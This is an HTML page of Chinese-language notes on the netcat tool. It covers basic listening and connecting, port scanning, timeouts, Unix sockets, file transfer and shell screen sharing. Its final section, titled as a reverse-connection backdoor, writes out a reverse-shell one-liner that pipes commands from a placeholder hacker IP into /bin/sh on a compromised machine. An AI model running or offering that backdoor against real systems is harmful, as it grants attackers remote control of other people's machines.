cli/netcat.html
<!DOCTYPE html>
<html>
<head>
<title>Netcat</title>
<!-- 2018-02-06 Tue 23:17 -->
<meta  charset="utf-8">
<meta  name="generator" content="Org-mode">
<meta  name="author" content="Hao Ruan">
<link href="http://fonts.googleapis.com/css?family=Roboto+Slab:400,700|Inconsolata:400,700" rel="stylesheet" type="text/css" />
<link href="../org-html-themes/css/style.css" rel="stylesheet" type="text/css" />
</head>
<body>
<div id="content">
<h1 class="title">Netcat</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#sec-1">1. 基本用法</a>
<ul>
<li><a href="#sec-1-1">1.1. 服务器端</a></li>
<li><a href="#sec-1-2">1.2. 客户端</a></li>
</ul>
</li>
<li><a href="#sec-2">2. 用法示例</a>
<ul>
<li><a href="#sec-2-1">2.1. 检测端口</a></li>
<li><a href="#sec-2-2">2.2. 设置连接超时</a></li>
<li><a href="#sec-2-3">2.3. 指定源 IP</a></li>
<li><a href="#sec-2-4">2.4. 使用 Unix Domain Socket</a>
<ul>
<li><a href="#sec-2-4-1">2.4.1. 服务器端</a></li>
<li><a href="#sec-2-4-2">2.4.2. 客户端</a></li>
</ul>
</li>
<li><a href="#sec-2-5">2.5. 传输文件</a></li>
<li><a href="#sec-2-6">2.6. 共享屏幕</a>
<ul>
<li><a href="#sec-2-6-1">2.6.1. 一对多</a></li>
<li><a href="#sec-2-6-2">2.6.2. 一对一</a></li>
</ul>
</li>
<li><a href="#sec-2-7">2.7. 反向连接后门</a>
<ul>
<li><a href="#sec-2-7-1">2.7.1. 黑客机输入命令</a></li>
<li><a href="#sec-2-7-2">2.7.2. 肉机输入命令</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
</div>
<div class="outline-2" id="meta">
<table>


<colgroup>
<col  class="left">

<col  class="left">
</colgroup>
<tbody>
<tr>
<td class="left">Author</td>
<td class="left">Hao Ruan (haoru@cisco.com)</td>
</tr>

<tr>
<td class="left">Date</td>
<td class="left">2018-02-06 23:17:54</td>
</tr>
</tbody>
</table>
</div>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#sec-1">1. 基本用法</a>
<ul>
<li><a href="#sec-1-1">1.1. 服务器端</a></li>
<li><a href="#sec-1-2">1.2. 客户端</a></li>
</ul>
</li>
<li><a href="#sec-2">2. 用法示例</a>
<ul>
<li><a href="#sec-2-1">2.1. 检测端口</a></li>
<li><a href="#sec-2-2">2.2. 设置连接超时</a></li>
<li><a href="#sec-2-3">2.3. 指定源 IP</a></li>
<li><a href="#sec-2-4">2.4. 使用 Unix Domain Socket</a>
<ul>
<li><a href="#sec-2-4-1">2.4.1. 服务器端</a></li>
<li><a href="#sec-2-4-2">2.4.2. 客户端</a></li>
</ul>
</li>
<li><a href="#sec-2-5">2.5. 传输文件</a></li>
<li><a href="#sec-2-6">2.6. 共享屏幕</a>
<ul>
<li><a href="#sec-2-6-1">2.6.1. 一对多</a></li>
<li><a href="#sec-2-6-2">2.6.2. 一对一</a></li>
</ul>
</li>
<li><a href="#sec-2-7">2.7. 反向连接后门</a>
<ul>
<li><a href="#sec-2-7-1">2.7.1. 黑客机输入命令</a></li>
<li><a href="#sec-2-7-2">2.7.2. 肉机输入命令</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
</div>


<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1"><span class="section-number-2">1</span> 基本用法</h2>
<div class="outline-text-2" id="text-1">
</div><div id="outline-container-sec-1-1" class="outline-3">
<h3 id="sec-1-1"><span class="section-number-3">1.1</span> 服务器端</h3>
<div class="outline-text-3" id="text-1-1">
<div class="org-src-container">

<pre class="src src-sh">nc -l &lt;port&gt;
</pre>
</div>
</div>
</div>


<div id="outline-container-sec-1-2" class="outline-3">
<h3 id="sec-1-2"><span class="section-number-3">1.2</span> 客户端</h3>
<div class="outline-text-3" id="text-1-2">
<div class="org-src-container">

<pre class="src src-sh">nc &lt;ip&gt; &lt;port&gt;
</pre>
</div>
</div>
</div>
</div>


<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2"><span class="section-number-2">2</span> 用法示例</h2>
<div class="outline-text-2" id="text-2">
</div><div id="outline-container-sec-2-1" class="outline-3">
<h3 id="sec-2-1"><span class="section-number-3">2.1</span> 检测端口</h3>
<div class="outline-text-3" id="text-2-1">
<div class="org-src-container">

<pre class="src src-sh">nc -w 1 -z &lt;ip&gt; 20-30
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-2-2" class="outline-3">
<h3 id="sec-2-2"><span class="section-number-3">2.2</span> 设置连接超时</h3>
<div class="outline-text-3" id="text-2-2">
<div class="org-src-container">

<pre class="src src-sh">nc -w 5 &lt;ip&gt; &lt;port&gt;
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-2-3" class="outline-3">
<h3 id="sec-2-3"><span class="section-number-3">2.3</span> 指定源 IP</h3>
<div class="outline-text-3" id="text-2-3">
<div class="org-src-container">

<pre class="src src-sh">## -s 指定 src ip
nc -s 10.1.2.3 &lt;ip&gt; &lt;port&gt;
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-2-4" class="outline-3">
<h3 id="sec-2-4"><span class="section-number-3">2.4</span> 使用 Unix Domain Socket</h3>
<div class="outline-text-3" id="text-2-4">
</div><div id="outline-container-sec-2-4-1" class="outline-4">
<h4 id="sec-2-4-1"><span class="section-number-4">2.4.1</span> 服务器端</h4>
<div class="outline-text-4" id="text-2-4-1">
<div class="org-src-container">

<pre class="src src-sh">nc -lU /var/tmp/dsocket
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-2-4-2" class="outline-4">
<h4 id="sec-2-4-2"><span class="section-number-4">2.4.2</span> 客户端</h4>
<div class="outline-text-4" id="text-2-4-2">
<div class="org-src-container">

<pre class="src src-sh">nc -U /var/tmp/dsocket
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-sec-2-5" class="outline-3">
<h3 id="sec-2-5"><span class="section-number-3">2.5</span> 传输文件</h3>
<div class="outline-text-3" id="text-2-5">
<div class="org-src-container">

<pre class="src src-sh">nc -v -l 8080 &lt; file.txt       ## 服务器端
nc &lt;ip&gt;  8080 &gt; save_file.txt  ## 客户端

nc -v -l 8080 &gt; file.txt       ## 服务器端
nc &lt;ip&gt;  8080 &lt; save_file.txt  ## 客户端
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-2-6" class="outline-3">
<h3 id="sec-2-6"><span class="section-number-3">2.6</span> 共享屏幕</h3>
<div class="outline-text-3" id="text-2-6">
</div><div id="outline-container-sec-2-6-1" class="outline-4">
<h4 id="sec-2-6-1"><span class="section-number-4">2.6.1</span> 一对多</h4>
<div class="outline-text-4" id="text-2-6-1">
<div class="org-src-container">

<pre class="src src-sh">script -qf | tee &gt;(nc -kl 5000) &gt;(nc -kl 5001) &gt;(nc -kl 5002)
## run 'nc yourip 5000', 'nc yourip 5001' or 'nc yourip 5002' elsewhere
## will produce an exact same mirror of your shell.
## This is handy when you want to show someone else some amazing stuff
## in your shell without giving them control over it.
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-2-6-2" class="outline-4">
<h4 id="sec-2-6-2"><span class="section-number-4">2.6.2</span> 一对一</h4>
<div class="outline-text-4" id="text-2-6-2">
<div class="org-src-container">

<pre class="src src-sh">mkfifo foo; script -f foo ## master
cat foo ## slaver
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-sec-2-7" class="outline-3">
<h3 id="sec-2-7"><span class="section-number-3">2.7</span> 反向连接后门</h3>
<div class="outline-text-3" id="text-2-7">
<p>
在黑客机 2345 端口上输入命令，在 2346 端口查看结果
</p>
</div>

<div id="outline-container-sec-2-7-1" class="outline-4">
<h4 id="sec-2-7-1"><span class="section-number-4">2.7.1</span> 黑客机输入命令</h4>
<div class="outline-text-4" id="text-2-7-1">
<div class="org-src-container">

<pre class="src src-sh">## hacker
nc -l 2345
nc -l 2346
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-2-7-2" class="outline-4">
<h4 id="sec-2-7-2"><span class="section-number-4">2.7.2</span> 肉机输入命令</h4>
<div class="outline-text-4" id="text-2-7-2">
<div class="org-src-container">

<pre class="src src-sh">nc &lt;hacker-ip&gt; 2345 | /bin/sh | nc &lt;hacker-ip&gt; 2346
</pre>
</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>